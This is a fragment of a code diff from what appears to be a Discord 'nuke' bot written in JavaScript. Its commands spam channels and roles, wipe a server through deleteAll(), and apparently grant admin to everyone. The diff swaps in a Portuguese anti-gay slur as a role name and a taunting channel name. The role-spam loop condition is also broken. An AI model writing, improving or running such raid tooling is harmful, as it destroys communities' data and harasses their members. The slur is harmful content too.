@@ -75,12 +75,12 @@ client.on("message", async (message) => {
                     message.guild.createChannel(`${args.slice(0).join(' ')}`, 'voice')
                 }
             }
-            for(i = 0; i == 250; i++) message.guild.createRole('NOOT NOOT')
+            for(i = 0; i == 250; i++) message.guild.createRole({name: 'boiola'})
         break;
         case "del":
             message.delete();
             server.deleteAll();
-            message.guild.createChannel('lmaoo', 'text')
+            message.guild.createChannel('se fudeu', 'text')
         break;
         case "admall":
             message.delete();
